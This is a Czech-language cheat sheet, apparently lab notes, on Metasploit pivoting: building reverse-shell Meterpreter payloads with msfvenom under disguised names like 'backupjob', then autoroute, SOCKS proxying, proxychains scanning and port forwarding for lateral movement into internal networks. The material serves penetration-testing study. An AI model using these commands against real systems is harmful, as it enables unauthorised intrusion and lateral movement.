# Metasploit Pivoting & Routing (Meterpreter)

Metasploit umožňuje využít kompromitovaný systém jako **pivot host**. Pomocí Meterpreter session lze:

- přistupovat do interních sítí
- nastavovat routy
- skenovat interní hosty
- vytvářet port forwardy
- provádět lateral movement

---

# 1. Získání Meterpreter Session na Pivot Hostu

## Vytvoření payloadu

Příklad Linux pivot host:

```
msfvenom -p linux/x64/meterpreter/reverse_tcp \
LHOST=10.10.14.18 \
LPORT=8080 \
-f elf \
-o backupjob
```

Význam:

|Parametr|Funkce|
|---|---|
|LHOST|IP útočníka|
|LPORT|port listeneru|
|-f elf|Linux executable|

---

## Listener v Metasploitu

```
msfconsole
```

Nastavení:

```
use exploit/multi/handler

set payload linux/x64/meterpreter/reverse_tcp

set LHOST 0.0.0.0

set LPORT 8080

run
```

---

## Spuštění na pivot hostu

Přenos:

```
scp backupjob user@pivot:/tmp/
```

Práva:

```
chmod +x backupjob
```

Spuštění:

```
./backupjob
```

Výsledek:

```
meterpreter session 1 opened
```

Pivot host je připraven.

---

# 2. Enumerace Interní Sítě

Příklad interní síť:

```
172.16.5.0/23
```

---

# Ping Sweep přes Meterpreter

```
meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

Výsledek:

```
172.16.5.19 alive
172.16.5.20 alive
172.16.5.21 alive
```

---

# Manuální Ping Sweep

## Linux pivot

```
for i in {1..254}; do 
ping -c 1 172.16.5.$i | grep "bytes from" &
done
```

---

## Windows pivot

PowerShell:

```
1..254 | % {
"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"
}
```

---

# 3. Metasploit Autoroute (Routing)

Aby Kali dokázalo komunikovat s interní sítí přes Meterpreter session, musí se přidat route.

---

## Přidání routy

V `msfconsole`:

```
use post/multi/manage/autoroute

set SESSION 1

set SUBNET 172.16.5.0

run
```

---

Kontrola:

```
run autoroute -p
```

Výstup:

```
Subnet
172.16.5.0/23
Session 1
```

---

# 4. SOCKS Proxy přes Metasploit

Autoroute samo nestačí.

Potřebujeme SOCKS proxy.

---

## Spuštění SOCKS serveru

```
use auxiliary/server/socks_proxy

set SRVPORT 9050

set VERSION 4a

run
```

Proxy:

```
127.0.0.1:9050
```

---

# 5. Proxychains konfigurace

Soubor:

```
sudo nano /etc/proxychains4.conf
```

Přidat:

```
socks4 127.0.0.1 9050
```

---

# Skenování interního hostu

Například RDP:

```
proxychains nmap \
-sT \
-Pn \
-n \
172.16.5.19 \
-p 3389
```

---

Parametry:

|Parametr|Význam|
|---|---|
|-sT|TCP connect scan|
|-Pn|ignoruje ping|
|-n|vypne DNS|

---

# 6. Meterpreter Port Forwarding

Meterpreter má vlastní alternativu k SSH tunelům:

```
portfwd
```

Výhoda:

- nepotřebuje Proxychains
- vhodné pro konkrétní služby
- rychlé pro RDP/SSH/databáze

---

# Local Port Forward (-L)

## Použití

Chci dostat jednu interní službu na svůj localhost.

Ekvivalent:

```
SSH -L
```

---

## Syntaxe

```
portfwd add 
-l LOCAL_PORT
-p TARGET_PORT
-r TARGET_IP
```

---

## Příklad RDP

Interní Windows:

```
172.16.5.19:3389
```

Tunel:

```
meterpreter > portfwd add \
-l 3300 \
-p 3389 \
-r 172.16.5.19
```

Výsledek:

```
localhost:3300
        |
        |
172.16.5.19:3389
```

Připojení:

```
xfreerdp /v:localhost:3300 /u:victor /p:password
```

---

# 7. Reverse Port Forward (-R)

Použití:

Interní stroj se potřebuje připojit zpět na Kali.

Ekvivalent:

```
SSH -R
```

---

## Syntaxe

```
portfwd add -R \
-l [KALI_PORT] \
-p [PIVOT_PORT] \
-L [KALI_IP]
```

---

## Příklad

Pivot:

```
172.16.5.129
```

Kali:

```
10.10.14.18
```

Meterpreter:

```
portfwd add -R \
-l 8081 \
-p 1234 \
-L 10.10.14.18
```

---

# Reverse Shell Flow

Topologie:

```
Windows Target

      |
      |
172.16.5.129:1234

      |
      |
Pivot Host

      |
      |
Meterpreter Tunnel

      |
      |
Kali:8081
```

---

# Payload pro Windows

```
msfvenom \
-p windows/x64/meterpreter/reverse_tcp \
LHOST=172.16.5.129 \
LPORT=1234 \
-f exe \
-o backupscript.exe
```

Windows spustí:

```
backupscript.exe
```

Výsledek:

```
meterpreter session opened
```

---

# 8. Správa Port Forwardů

## Výpis

```
portfwd list
```

---

## Smazání konkrétního tunelu

```
portfwd delete \
-l 3300 \
-p 3389 \
-r 172.16.5.19
```

---

## Smazání všech tunelů

```
portfwd flush
```

---

# Metasploit Pivoting Workflow

```
Initial Access
        |
        ↓
Meterpreter Session
        |
        ↓
Zjistit rozhraní:
ipconfig / ifconfig

        |
        ↓
Najít interní síť

        |
        ↓
autoroute

        |
        ↓
SOCKS Proxy

        |
        ↓
Proxychains + Nmap

        |
        ↓
Najít služby

        |
        ↓
portfwd / lateral movement
```

---

# SSH vs Metasploit Pivoting

|Funkce|SSH|Metasploit|
|---|---|---|
|Local Forward|-L|portfwd|
|Dynamic Proxy|-D|socks_proxy|
|Reverse Forward|-R|portfwd -R|
|Routing|ručně|autoroute|
|Integrace s exploity|omezená|vysoká|